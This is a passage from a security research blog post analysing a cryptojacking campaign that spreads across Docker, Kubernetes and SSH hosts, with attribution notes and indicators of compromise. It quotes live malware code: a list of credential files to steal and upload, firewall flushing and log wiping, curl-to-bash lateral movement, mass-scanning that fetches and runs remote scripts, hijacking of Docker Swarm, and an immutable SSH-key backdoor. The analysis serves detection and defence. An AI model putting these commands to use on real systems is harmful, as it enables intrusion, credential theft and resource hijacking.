<p>In addition to targeting Kubernetes and Docker, the threat actors use a third shell scriptânamed <code>spread_ssh.sh</code>âto identify and compromise SSH servers on the local network. This script is also executed directly in memory by <code>init.sh</code>.</p>
<p>The script first checks for an infection marker in the form of a file located at the path <code>/var/tmp/.alsp</code>. If this file isnât present, the malware prints a series of hash characters and makes a silent HTTP <code>GET</code> request to the IP 147[.]75.47.199 using <code>curl</code>. This IP was previously attributed to TeamTNT by <a href="https://intezer.com/blog/malware-analysis/teamtnt-cryptomining-explosion/">Intezer</a> in 2022. If the file is found, the script echos <code>replay .. i know this server â¦</code> before exiting.</p>
<p><code>spread_ssh.sh</code> then retrieves <code>pnscan</code> as a tar archive from the C2 server, which is used instead of <code>masscan</code> or <code>zgrab</code> to scan the LAN for hosts with port 22 open. The command <code>ip route show</code> is used to determine the subnet in which the current node resides, to be used for scanning. After parsing the output of this command, the results are stored in a file at the path <code>/home/hilde/.ssh/.ranges</code> and the scan results are stored in <code>/home/hilde/.ssh/.known_hosts</code>. The malware also attempts to discover known hosts by searching for SSH commands and IP addresses in shell history, in addition to searching for SSH private keys to be used in connection attempts.</p>
<p>For any discovered SSH servers, the script will connect to each in turn and attempt to use SSH remote command invocation to spread a copy of itself to the target host. This is achieved by using <code>curl</code> to retrieve the payload on the target host and executing it directly in memory by piping through <code>sh</code>.</p>
<p>Two additional scripts are executed by <code>spread_ssh.sh</code>â<code>search.sh</code> and <code>setup_xmr.sh</code> (covered in the <a href="#resource-hijacking">Resource Hijacking</a> section). The first, named <code>search.sh</code>, defines an SSH key to be used by the threat actors to connect to the existing compromised host. It also creates a new user named <code>ftp</code> and assigns the user a password of <code>Nmlmtcg1999$</code>, allowing the threat actors to maintain access to the compromised host.</p>
<p><code>search.sh</code> also hunts for credential files associated with cloud and other networked services by using an array of hardcoded paths:</p>
<pre class="language-bash"><code class="language-bash"><span class="token builtin class-name">declare</span> <span class="token parameter variable">-a</span> <span class="token assign-left variable">PATH_ARRAY</span><span class="token operator">=</span><span class="token punctuation">(</span>
    <span class="token string">"/home/codespace/.ssh/id_rsa"</span>
    <span class="token string">"/home/codespace/.ssh/id_rsa.pub"</span>
    <span class="token string">"/home/codespace/.ssh/known_hosts"</span>
    <span class="token string">"/home/codespace/.ssh/config"</span>
    <span class="token string">"/home/codespace/.ssh/authorized_keys"</span>
    <span class="token string">"/home/codespace/.ssh/authorized_keys2"</span>
    <span class="token string">"/home/codespace/.aws/config"</span>
    <span class="token string">"/home/codespace/.aws/credentials"</span>
    <span class="token string">"/home/codespace/.aws/credentials.gpg"</span>
    <span class="token string">"/home/codespace/.docker/config.json"</span>
    <span class="token string">"/home/codespace/.docker/ca.pem"</span>
    <span class="token string">"/home/codespace/.s3backer_passwd"</span>
    <span class="token string">"/home/codespace/s3proxy.conf"</span>
    <span class="token string">"/home/codespace/.s3ql/authinfo2"</span>
    <span class="token string">"/home/codespace/.passwd-s3fs"</span>
    <span class="token string">"/home/codespace/.s3cfg"</span>
    <span class="token string">"/home/codespace/.git-credentials"</span>
    <span class="token string">"/home/codespace/.gitconfig"</span>
    <span class="token string">"/home/codespace/.shodan/api_key"</span>
    <span class="token string">"/home/codespace/.ngrok2/ngrok.yml"</span>
    <span class="token string">"/home/codespace/.purple/accounts.xml"</span>
    <span class="token string">"/home/codespace/.config/filezilla/filezilla.xml"</span>
    <span class="token string">"/home/codespace/.config/filezilla/recentservers.xml"</span>
    <span class="token string">"/home/codespace/.config/hexchat/servlist.conf"</span>
    <span class="token string">"/home/codespace/.config/monero-project/monero-core.conf"</span>
    <span class="token string">"/home/codespace/.boto"</span>
    <span class="token string">"/home/codespace/.netrc"</span>
    <span class="token string">"/home/codespace/.config/gcloud/access_tokens.db"</span>
    <span class="token string">"/home/codespace/.config/gcloud/credentials.db"</span>
    <span class="token string">"/home/codespace/.davfs2/secrets"</span>
    <span class="token string">"/home/codespace/.pgpass"</span>
    <span class="token string">"/home/codespace/.local/share/jupyter/runtime/notebook_cookie_secret"</span>
    <span class="token string">"/home/codespace/.smbclient.conf"</span>
    <span class="token string">"/home/codespace/.smbcredentials"</span>
    <span class="token string">"/home/codespace/.samba_credentials"</span>
<span class="token punctuation">)</span></code></pre>
<p>These paths indicate that the threat actor intends to target compute instances used for GitHubâs <a href="https://github.com/features/codespaces">Codespaces</a> remote development feature. If any files are discovered at these paths, the script bundles them into a tar archive and uploads them to the following C2 endpoint: <code>https://solscan[.]live/upload.php</code>.</p>
<h2 id="resource-hijacking" tabindex="-1"><a class="header-anchor" href="#resource-hijacking">Resource hijacking</a></h2>
<p>Both the Kubernetes and SSH lateral movement payloads deploy an additional script named <code>setup_xmr.sh</code>, which is used to retrieve and execute the XMRig cryptocurrency miner. This payload is also hosted on the threat actorâs C2 server, along with the XMRig binary itself. <code>setup_xmr.sh</code> saves the XMRig binary as <code>/var/tmp/.system</code>, before changing into the directory and executing the miner with the following parameters:</p>
<ul>
<li>Mining pool: <code>pool.supportxmr.com:3333</code></li>
<li>Username: <code>4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9</code></li>
<li>Mining pool password: <code>GesichtsKirmes</code> (translates to âFaceFairâ from German)</li>
</ul>
<p>In addition to this, another script named <code>spread_kube_loop.sh</code> is retrieved and executed. This script contains Kubernetes lateral movement code with similar functionality to that described in the analysis of <code>kube.lateral.sh</code>, the only exception being that the scan ranges are not limited to the LAN.</p>
<h2 id="c2-enumeration-and-additional-payloads" tabindex="-1"><a class="header-anchor" href="#c2-enumeration-and-additional-payloads">C2 enumeration and additional payloads</a></h2>
<p>After analyzing the payloads described above, we discovered that the web server behind the solscan[.]live domainâused for payload delivery throughout this campaignâwas exposing a publicly accessible web directory. We enumerated this directory and discovered additional payloads belonging to the threat actor.</p>
<p>These included:</p>
<ul>
<li><code>ar.sh</code>, a variant of <code>init.sh</code></li>
<li><code>TDGINIT.sh</code></li>
<li><code>pdflushs.sh</code></li>
</ul>
<p>Passive C2 enumeration led to the discovery of <code>ar.sh</code>, a variant of <code>init.sh</code> that modifies <code>iptables</code> rules and adjusts system configurations to evade detection. <code>ar.sh</code> also clears logs and cron jobs, replacing them with malicious entries to ensure the minerâs uninterrupted operation.</p>
<pre class="language-bash"><code class="language-bash">iptables <span class="token parameter variable">-F</span> systemctl stop firewalld <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null systemctl disable firewalld <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null <span class="token function">service</span> iptables stop <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null <span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-n</span> <span class="token number">65535</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/null</code></pre>
<p><em>Modification of iptables</em></p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">localgo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token builtin class-name">echo</span> <span class="token operator">></span> /var/spool/mail/root
  <span class="token builtin class-name">echo</span> <span class="token operator">></span> /var/log/wtmp
  <span class="token builtin class-name">echo</span> <span class="token operator">></span> /var/log/secure
  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /root/.ssh/known_hosts <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /root/.ssh/id_rsa.pub <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token keyword">for</span> <span class="token for-or-select variable">h</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oE</span> <span class="token string">"<span class="token entity" title="\b">\b</span>([0-9]{1,3}\.){3}[0-9]{1,3}<span class="token entity" title="\b">\b</span>"</span> /root/.ssh/known_hosts<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> 
      <span class="token function">ssh</span> <span class="token parameter variable">-oBatchMode</span><span class="token operator">=</span>yes <span class="token parameter variable">-oConnectTimeout</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">-oStrictHostKeyChecking</span><span class="token operator">=</span>no <span class="token variable">$h</span> <span class="token string">'curl -o-  ${mainurl/b.sh} | bash >/dev/null 2>&amp;1 &amp;'</span> <span class="token operator">&amp;</span> 
    <span class="token keyword">done</span>
  <span class="token keyword">fi</span>
<span class="token punctuation">}</span></code></pre>
<p><em>Clearing local logs and lateral movement to SSH known hosts</em></p>
<p><code>ar.sh</code> also differed from <code>init.sh</code> in its delivery of libprocesshider. Instead of retrieving the compiled binary from the C2 server, the threat actor decodes an inline base64-encoded version of the process hiderâs source code before compiling it on delivery.</p>
<p>Similar to the scripts described above, <code>TDGINIT.sh</code> starts downloading the required tools, including <code>curl</code>, <code>wget</code>, <code>bash</code>, <code>masscan</code>, <code>jq</code>, and <code>docker</code>, from its C2 server <code>http://solscan[.]live/bin/zgrab</code>.  It also performs a masscan scan targeting specific ports, such as 2375, 2376, and 4243. For each identified host, it uploads its findings to its C2 server <code>wget -q &quot;http://solscan[.]live/incoming/docker.php?dockerT=$IPADDR:$PORT&quot;</code> . Additionally, it executes a series of malicious commands, including downloading and running Docker containers, such as <code>xululol/unminerxmr</code>.</p>
<p>One interesting tactic used by the script is its manipulation of Docker Swarm. After compromising a Docker host, the script forces the host to leave any existing Swarm, only to join a new Swarm controlled by the threat actor using a predefined token. This allows the threat actor to expand their control over multiple Docker instances in a coordinated fashion, effectively turning compromised systems into a botnet for further exploitation. This is the first time Datadog Security Research has observed the manipulation of Docker Swarm.</p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">DOCKER_GATLING_GUN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token variable">$1</span>
  <span class="token assign-left variable">RATE</span><span class="token operator">=</span><span class="token variable">$2</span>
  <span class="token assign-left variable">RANGE</span><span class="token operator">=</span><span class="token variable">$3</span>
  <span class="token assign-left variable">rndstr</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">head</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> a-z <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">6</span> <span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token string">''</span><span class="token variable">)</span></span>
  <span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$rndstr</span>"</span><span class="token operator">=</span><span class="token string">"'<span class="token variable"><span class="token variable">$(</span>masscan -p$PORT $RANGE.0.0.0/8 <span class="token parameter variable">--rate</span><span class="token operator">=</span>$RATE <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $6}'</span><span class="token operator">|</span> zgrab <span class="token parameter variable">--senders</span> <span class="token number">200</span> <span class="token parameter variable">--port</span> $PORT <span class="token parameter variable">--http</span><span class="token operator">=</span><span class="token string">'/v1.16/version'</span> --output-file<span class="token operator">=</span>- <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'ApiVersion|client version 1.16'</span> <span class="token operator">|</span> jq <span class="token parameter variable">-r</span> .ip<span class="token variable">)</span></span>'"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token for-or-select variable">IPADDR</span> <span class="token keyword">in</span> <span class="token variable">${<span class="token operator">!</span>rndstr}</span><span class="token punctuation">;</span> <span class="token keyword">do</span> 
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$IPADDR</span>:<span class="token variable">$PORT</span>"</span>
    <span class="token function">wget</span> <span class="token parameter variable">-q</span> <span class="token string">"http://solscan.live/incoming/docker.php?dockerT=<span class="token variable">$IPADDR</span>:<span class="token variable">$PORT</span>"</span> <span class="token parameter variable">-O</span> /dev/null
    <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token number">120</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token variable">$IPADDR</span><span class="token builtin class-name">:</span><span class="token variable">$PORT</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--privileged</span> <span class="token parameter variable">--net</span> <span class="token function">host</span> <span class="token parameter variable">-v</span> /:/mnt xululol/unminerxmr 
    <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token number">120</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token variable">$IPADDR</span><span class="token builtin class-name">:</span><span class="token variable">$PORT</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--privileged</span> <span class="token parameter variable">--net</span> <span class="token function">host</span> <span class="token parameter variable">-v</span> /:/mnt alpine <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">'apk update; apt-get update ; yum clean all ; apk add bash wget ; apt-get install -y bash wget ; yum install -y bash wget ; wget -O -  http://solscan.live/chimaera/sh/init.sh | sh || curl  http://solscan.live/chimaera/sh/init.sh | bash'</span> <span class="token operator">&amp;</span>
    <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token number">30</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token variable">$IPADDR</span><span class="token builtin class-name">:</span><span class="token variable">$PORT</span> swarm leave <span class="token parameter variable">--force</span>
    <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token number">30</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token variable">$IPADDR</span><span class="token builtin class-name">:</span><span class="token variable">$PORT</span> swarm <span class="token function">join</span> <span class="token parameter variable">--token</span> SWMTKN-1-5boro95fiuswddse7fpl7nzpavv3xon3xpbynelcrtnu7vqggt-cd9rfe6vsjsw7gdq1cq5nspw4 <span class="token number">164.68</span>.106<span class="token punctuation">[</span>.<span class="token punctuation">]</span><span class="token number">96</span>:2377
  <span class="token keyword">done</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><em>Docker Swarm manipulation</em></p>
<p>This snippet illustrates how the script forces Docker instances to join a malicious Docker Swarm controlled by the threat actor at <code>164.68.106.96</code>.</p>
<p>In addition to <code>ar.sh</code> and <code>TDGINIT.sh</code>, we also encountered a script named <code>pdflushs.sh</code>. The script installs a persistent backdoor by appending a threat-actor-controlled SSH key to the <code>/root/.ssh/authorized_keys</code> file. This backdoor is protected using <code>chattr +ai</code>, which makes the file immutable, preventing removal or modification. If the key is missing or the immutability is disabled, the script reinstates the key and reapplies the immutable flag, ensuring the backdoor remains intact.</p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">checkBackdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token variable">$busybox</span> chattr +ai /root/.ssh/authorized_keys
   <span class="token keyword">if</span> <span class="token operator">!</span> <span class="token variable">$busybox</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">"paDKiUwmHNUSW7E1S18Cl"</span> /root/.ssh/authorized_keys
   <span class="token keyword">then</span>
       <span class="token variable">$busybox</span> <span class="token builtin class-name">echo</span> <span class="token string">"ssh-rsa AAAAB3..."</span> <span class="token operator">></span> /root/.ssh/authorized_keys
       <span class="token variable">$busybox</span> chattr +ai /root/.ssh/authorized_keys
   <span class="token keyword">fi</span>
<span class="token punctuation">}</span></code></pre>
<p>The script establishes communication with the same C2 server located at <code>solscan[.]live</code> to check for updates to its components. By downloading the SHA-512 hash of various malware files from the server, it compares them with the local versions. If any discrepancies are found, the script fetches and installs the updated components. Datadog Security Research has started observing an increase in malicious software validation and process termination of other malicious software, which hints at a potential turf conflict among threat actors.</p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">download2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$WGET</span> <span class="token variable">$DIR</span>/solscan https://solscan<span class="token punctuation">[</span>.<span class="token punctuation">]</span>live/chimaera/bin/xmr/x86_64
  <span class="token function">chmod</span> +x <span class="token variable">$DIR</span>/solscan
  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-x</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">command</span> <span class="token parameter variable">-v</span> md5sum<span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>md5sum $DIR/solscan <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{ print $1 }'</span><span class="token variable">)</span></span>
    <span class="token builtin class-name">echo</span> <span class="token variable">$sum</span>
    <span class="token keyword">case</span> <span class="token variable">$sum</span> <span class="token keyword">in</span>
    154c26c9ddc84930f2acd899cd182916<span class="token punctuation">)</span>
      <span class="token builtin class-name">echo</span> <span class="token string">"solscan OK"</span>
      <span class="token punctuation">;</span><span class="token punctuation">;</span>
    *<span class="token punctuation">)</span>
      <span class="token builtin class-name">echo</span> <span class="token string">"solscan wrong"</span>
      download3
      <span class="token punctuation">;</span><span class="token punctuation">;</span>
    <span class="token keyword">esac</span>
  <span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"No md5sum"</span>
    download3
  <span class="token keyword">fi</span>
<span class="token punctuation">}</span></code></pre>
<p><em>Validating integrity of XMR</em></p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">checkUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token assign-left variable">remoteXmrigSha512</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$busybox <span class="token function">wget</span> http://$remoteIp/sha512/xmrig <span class="token parameter variable">-O</span> - <span class="token parameter variable">-q</span><span class="token variable">`</span></span>
    <span class="token assign-left variable">localXmrigSha512</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$busybox sha512sum $xmrig <span class="token operator">|</span> $busybox <span class="token function">awk</span> <span class="token string">'{print $1}'</span><span class="token variable">`</span></span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$remoteXmrigSha512</span> <span class="token operator">!=</span> <span class="token variable">$localXmrigSha512</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token keyword">then</span>
        <span class="token variable">$busybox</span> <span class="token function">wget</span> http://<span class="token variable">$remoteIp</span>/update/xmrig <span class="token parameter variable">-O</span> <span class="token variable">$xmrig</span>
    <span class="token keyword">fi</span>
<span class="token punctuation">}</span></code></pre>
<p><em>Checking for updates</em></p>
<p>To maintain persistence, the script leverages cron jobs, using the hidden <code>libgc++.so</code> file as a cron daemon. It ensures that the cron process is always running and restarts it if necessary. Additionally, the cron job itself is checked regularly to ensure it hasnât been modified or removed.</p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">checkCronProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">`</span>$busybox <span class="token function">ps</span> <span class="token operator">|</span> $busybox <span class="token function">grep</span> <span class="token string">"libgc++.so"</span> <span class="token operator">|</span> $busybox <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> $busybox <span class="token function">wc</span> <span class="token parameter variable">-l</span><span class="token variable">`</span></span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>
   <span class="token keyword">then</span>
       <span class="token function">nohup</span> <span class="token variable">$cron</span> <span class="token operator">></span> /dev/null <span class="token operator">&amp;</span>
   <span class="token keyword">fi</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="attribution" tabindex="-1"><a class="header-anchor" href="#attribution">Attribution</a></h2>
<p>Several tactics, techniques and procedures used throughout this campaign overlap with those attributed to TeamTNT. The group is well-known for targeting microservice technologies commonly deployed in cloud environments, including Docker and Kubernetes.</p>
<p>Additionally, payloads from the current campaign include multiple references to infrastructure and artifacts from previous campaigns. <code>init.sh</code> contains commented-out references to borg[.]wtf, a domain attributed to TeamTNT by <a href="https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/">Unit42</a> in 2021. Similarly, <code>setup_xmr.sh</code> contains commented-out references to the IP 45[.]9[.]148[.]35, also attributed to TeamTNT by <a href="https://unit42.paloaltonetworks.com/teamtnt-operations-cloud-environments/">Unit42</a>.</p>
<p>Despite these similarities, at the time of writing we found no overlap in the infrastructure underpinning this campaign and the infrastructure used in our <a href="https://securitylabs.datadoghq.com/articles/analysis-of-teamtnt-doppelganger/">February</a> analysis of TeamTNT activities. In addition, the use of shell script payloads makes it difficult to cluster malware samples based on the use of strings and commented code. It would be trivial for the threat actor to add commented references to TeamTNT infrastructure found in public reporting to these scripts, for example.</p>
<p>Based on the available evidence, we assign low confidence to the attribution of this campaign. While some indicators suggest a possible link to prior activity, the lack of corroborating evidence prevents a direct conclusion at this time.</p>
<h2 id="how-datadog-can-help" tabindex="-1"><a class="header-anchor" href="#how-datadog-can-help">How Datadog can help</a></h2>
<p><a href="https://docs.datadoghq.com/security/threats/">Cloud Security Management (CSM) Threats</a> leverages a real-time eBPF agent to detect various stages of post-exploitation activity, including:</p>
<ul>
<li><a href="https://docs.datadoghq.com/security/default_rules/ssh_authorized_keys/">SSH authorized keys modified</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/net_util/">Network utility executed</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/paste_sites/">DNS lookup for paste site service</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/netflow_mining_domain/">Connection to cryptomining pool</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/open_docker_daemon/">Docker daemon publicly accessible</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/executable_bit_added/">Executable bit added to newly created file</a></li>
</ul>
<h2 id="conclusion" tabindex="-1"><a class="header-anchor" href="#conclusion">Conclusion</a></h2>
<p>This campaign demonstrates that services such as Docker and Kubernetes remain fruitful for threat actors conducting cryptojacking at scale. Payloads dedicated to lateral movement throughout the campaign show an awareness of common deployment scenarios in cloud environments, along with a knowledge of misconfigurations frequently encountered in the wild.</p>
<p>Despite this, the campaign relies on Docker API endpoints being exposed to the Internet without authentication. While this misconfiguration does occur, itâs likely that this is considered âlow-hanging fruitâ for threat actors and will attract campaigns of an opportunistic nature. Regardless, the malwareâs ability to propagate rapidly means that even if the chances of initial access are relatively slim, the rewards are high enough to keep cloud-focused malware groups motivated enough to continue conducting these attacks.</p>
<h2 id="indicators-of-compromise" tabindex="-1"><a class="header-anchor" href="#indicators-of-compromise">Indicators of compromise</a></h2>
<p>Files:</p>
<pre><code>docker.container.local.spread.txt (9d02707b895728b4229abd863aa6967d67cd8ce302b30dbcd946959e719842ad
init.sh (700635abe402248ccf3ca339195b53701d989adb6e34c014b92909a2a1d5a0ff)
kube.lateral.sh (2514e5233c512803eff99d4e16821ecc3b80cd5983e743fb25aa1bcc17c77c79)
search.sh (6157a74926cfd66b959d036b1725a63c704b76af33f59591c15fbf85917f76fa)
setup_xmr.sh (6f426065e502e40da89bbc8295e9ca039f28b50e531b33293cee1928fd971936)
spread_docker_local.sh (78ebc26741fc6bba0781c6743c0a3d3d296613cc8a2bce56ef46d9bf603c7264)
spread_kube_local.sh (e6985878b938bd1fba3e9ddf097ba1419ff6d77c3026abdd621504f5c4186441)
spread_ssh.sh (d99bd3a62188213894684d8f9b4f39dbf1453cc7707bac7f7b8f484d113534b0)
x86_64 (505237e566b9e8f4a83edbe45986bbe0e893c1ca4c5837c97c6c4700cfa0930a)
xmr.sh.sh (e4c4400a4317a193f49c0c53888ec2f27e20b276c2e6ee1a5fd6eacf3f2a0214)
xmrig (c5391314ce789ff28195858a126c8a10a4f9216e8bd1a8ef71d11c85c4f5175c)
xmrig.so (0af1b8cd042b6e2972c8ef43d98c0a0642047ec89493d315909629bcf185dffd)
</code></pre>
<p>Domains:</p>
<pre><code>solscan.live
ââx.solscan.live
</code></pre>
<p>IP addresses:</p>
<pre><code>164.68.106[.]96
</code></pre>
<p>URLs:</p>
<pre><code>http://192[.]155[.]94[.]199/sh/xmr[.]sh[.]sh
http://45[.]9[.]148[.]35/aws
https://solscan[.]live/aws[.]sh
https://solscan[.]live/bin/64bit/xmrig
https://solscan[.]live/bin/pnscan_1[.]12+git20180612[.]orig[.]tar[.]gz
https://solscan[.]live/bin/xmr/x86_64
https://solscan[.]live/bin/xmrig
https://solscan[.]live/data/docker[.]container[.]local[.]spread[.]txt
https://solscan[.]live/input/kube_in[.]php?target=&lt;IP Address&gt;
https://solscan[.]live/scan_threads[.]dat
https://solscan[.]live/sh/init[.]sh
https://solscan[.]live/sh/kube[.]lateral[.]sh
https://solscan[.]live/sh/search[.]sh
https://solscan[.]live/sh/setup_xmr[.]sh
https://solscan[.]live/sh/spread_docker_local[.]sh
https://solscan[.]live/sh/spread_kube_loop[.]sh
https://solscan[.]live/sh/spread_ssh[.]sh
https://solscan[.]live/sh/xmr[.]sh[.]sh
https://solscan[.]live/so/xmrig[.]so
https://solscan[.]live/up/kube_in[.]php?target=&lt;IP Address&gt;
https://solscan[.]live/upload[.]php
</code></pre>


        
      </div>

      <span class="block pb-7 tablet:pb-9 desktop:pb-12"></span>

      

      <div>
        <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fthreat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency%2F&amp;text=Threat%20Actors%20leverage%20Docker%20Swarm%20and%20Kubernetes%20to%20mine%20cryptocurrency%20at%20scale" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"/>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"/>
</g>
<defs>
<clipPath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"/>
</clipPath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fthreat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"/>
